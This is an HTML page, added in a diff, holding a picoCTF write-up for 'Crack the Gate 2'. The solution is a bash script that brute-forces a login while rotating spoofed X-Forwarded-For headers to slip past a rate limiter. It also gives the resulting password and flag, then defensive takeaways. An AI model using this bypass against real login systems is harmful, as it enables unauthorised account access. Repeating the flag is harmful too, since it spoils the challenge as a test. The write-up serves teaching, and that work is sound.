@@ -1,0 +1,168 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Crack the Gate 2 | Amidst CTF Write-up</title>
+  <link rel="icon" type="image/png" href="../assets/kafka-icon.png">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;600;700&family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+  <link rel="stylesheet" href="../style.css">
+  <link rel="stylesheet" href="../writeup.css">
+</head>
+<body>
+  <nav class="navbar scrolled" id="navbar">
+    <div class="nav-container">
+      <a href="../index.html#home" class="nav-logo">
+        <img src="../assets/kafka-icon.png" alt="Logo" class="nav-icon">
+        <span class="logo-bracket">{</span> Amidst <span class="logo-bracket">}</span>
+      </a>
+      <ul class="nav-menu">
+        <li><a href="../index.html#home">Home</a></li>
+        <li><a href="../index.html#about">About</a></li>
+        <li><a href="../index.html#skills">Skills</a></li>
+        <li><a href="../index.html#certifications">Certs</a></li>
+        <li><a href="../index.html#ctf" class="active">CTF</a></li>
+        <li><a href="../index.html#bugbounty">Bug Bounty</a></li>
+        <li><a href="../index.html#labs">Labs</a></li>
+        <li><a href="../index.html#contact">Contact</a></li>
+      </ul>
+    </div>
+  </nav>
+
+  <section class="writeup-header">
+    <div class="container">
+      <a href="../index.html#ctf" class="writeup-back"><i class="fas fa-arrow-left"></i> Back to Write-ups</a>
+      <h1>Crack the Gate 2</h1>
+      <div class="writeup-meta">
+        <span class="ctf-category web">Web Exploitation</span>
+        <span class="ctf-difficulty medium">Medium</span>
+        <span style="color: var(--text-muted); font-size: 0.85rem;"><i class="fas fa-flag" style="margin-right:5px;"></i>picoCTF</span>
+      </div>
+    </div>
+  </section>
+
+  <section class="writeup-body">
+    <div class="container">
+      <div class="writeup-content">
+        <h2 id="challenge-info">Challenge Info</h2>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Details</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Name</td>
+<td>Crack the Gate 2</td>
+</tr>
+<tr>
+<td>Category</td>
+<td>Web Exploitation</td>
+</tr>
+<tr>
+<td>Platform</td>
+<td>picoCTF</td>
+</tr>
+<tr>
+<td>URL</td>
+<td><code>http://amiable-citadel.picoctf.net:51043/</code></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Description:</strong>
+The login system has been upgraded with a basic rate-limiting mechanism that locks out repeated failed attempts from the same source. We've received a tip that the system might still trust user-controlled headers. Your objective is to bypass the rate-limiting restriction and log in using the known email address: <code>ctf-player@picoctf.org</code> and uncover the hidden secret.</p>
+<hr />
+<h2 id="solution">Solution</h2>
+<h3 id="step-1-download-the-password-list">Step 1: Download the Password List</h3>
+<p>The challenge provides a password list with 19 entries:</p>
+<pre><code class="language-bash">curl -s -o passwords.txt https://challenge-files.picoctf.net/.../passwords.txt
+wc -l passwords.txt
+# 19 passwords.txt
+</code></pre>
+<p>Only 19 passwords — a small list. The challenge isn't about finding the password, it's about bypassing the rate limiter.</p>
+<hr />
+<h3 id="step-2-understand-the-rate-limiting">Step 2: Understand the Rate Limiting</h3>
+<p>If we try to brute force normally, the server will block us after a few failed attempts because all requests come from the same IP. The challenge hint says:</p>
+<blockquote>
+<p>"the system might still trust user-controlled headers"</p>
+</blockquote>
+<p>This points to the <strong>X-Forwarded-For</strong> header — a standard HTTP header used by proxies and load balancers to pass the client's original IP address. If the rate limiter checks this header instead of the actual connection IP, we can spoof different IPs to avoid getting locked out.</p>
+<hr />
+<h3 id="step-3-brute-force-with-x-forwarded-for-rotation">Step 3: Brute Force with X-Forwarded-For Rotation</h3>
+<p>We send each login attempt with a different <code>X-Forwarded-For</code> IP so the rate limiter treats each request as coming from a unique client:</p>
+<pre><code class="language-bash">i=1
+while IFS= read -r pass; do
+  result=$(curl -s -X POST http://amiable-citadel.picoctf.net:51043/login \
+    -H &quot;Content-Type: application/json&quot; \
+    -H &quot;X-Forwarded-For: 10.0.0.$i&quot; \
+    -d &quot;{\&quot;email\&quot;:\&quot;ctf-player@picoctf.org\&quot;,\&quot;password\&quot;:\&quot;$pass\&quot;}&quot;)
+  echo &quot;[$i] $pass: $result&quot;
+
+  flag=$(echo &quot;$result&quot; | grep -o 'picoCTF{[^}]*}')
+  if [ -n &quot;$flag&quot; ]; then
+    echo &quot;FLAG FOUND: $flag&quot;
+    break
+  fi
+  i=$((i+1))
+done &lt; passwords.txt
+</code></pre>
+<p>Each request uses a different spoofed IP (<code>10.0.0.1</code>, <code>10.0.0.2</code>, <code>10.0.0.3</code>, ...), so the rate limiter never triggers.</p>
+<p><strong>Result:</strong></p>
+<pre><code>[1]  tKzytEv9: {&quot;success&quot;:false}
+[2]  gcMwJJ4z: {&quot;success&quot;:false}
+...
+[18] lGlNYYkO: {&quot;success&quot;:false}
+[19] axTtBLvc: {&quot;success&quot;:true, ..., &quot;flag&quot;:&quot;picoCTF{xff_byp4ss_brut3_3b2dc94d}&quot;}
+FLAG FOUND: picoCTF{xff_byp4ss_brut3_3b2dc94d}
+</code></pre>
+<p>The correct password is <code>axTtBLvc</code> (the last one in the list).</p>
+<hr />
+<h2 id="flag">Flag</h2>
+<pre><code>picoCTF{xff_byp4ss_brut3_3b2dc94d}
+</code></pre>
+<hr />
+<h2 id="key-takeaways">Key Takeaways</h2>
+<ol>
+<li>
+<p><strong>Never trust user-controlled headers for security decisions.</strong> The <code>X-Forwarded-For</code> header is set by the client and can be easily spoofed. If a rate limiter relies on this header to identify clients, an attacker can bypass it by sending a different IP with each request.</p>
+</li>
+<li>
+<p><strong>How X-Forwarded-For works:</strong></p>
+</li>
+<li>When a request passes through a proxy or load balancer, the proxy adds the client's real IP to the <code>X-Forwarded-For</code> header</li>
+<li>Format: <code>X-Forwarded-For: client_ip, proxy1_ip, proxy2_ip</code></li>
+<li>The problem: anyone can set this header directly, pretending to be behind a proxy</li>
+<li>
+<p>The fix: use the actual TCP connection IP (<code>req.socket.remoteAddress</code>) or only trust <code>X-Forwarded-For</code> from known proxy IPs</p>
+</li>
+<li>
+<p><strong>Rate limiting must use reliable identifiers.</strong> Effective rate limiting should be based on:</p>
+</li>
+<li>The actual connection IP (not a header)</li>
+<li>Authenticated user identity (session/token)</li>
+<li>A combination of multiple signals</li>
+<li>
+<p>Server-side counters that cannot be influenced by client headers</p>
+</li>
+<li>
+<p><strong>The flag name says it all.</strong> <code>xff_byp4ss_brut3</code> — X-Forwarded-For bypass + brute force. A classic attack pattern against poorly implemented rate limiters.</p>
+</li>
+</ol>
+      </div>
+    </div>
+  </section>
+
+  <footer class="footer">
+    <div class="container">
+      <div class="footer-content">
+        <p class="footer-logo"><span class="logo-bracket">{</span> Amidst <span class="logo-bracket">}</span></p>
+        <p class="footer-copy">&copy; 2026 Amidst. All rights reserved.</p>
+      </div>
+    </div>
+  </footer>
+</body>
+</html>
